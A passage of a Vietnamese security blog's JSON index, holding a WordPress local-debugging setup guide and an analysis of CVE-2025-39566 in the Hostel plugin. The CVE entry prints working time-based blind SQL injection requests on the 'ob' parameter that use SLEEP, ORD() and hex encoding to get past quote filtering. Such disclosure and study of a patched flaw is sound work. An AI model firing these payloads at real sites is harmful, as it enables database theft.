ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: 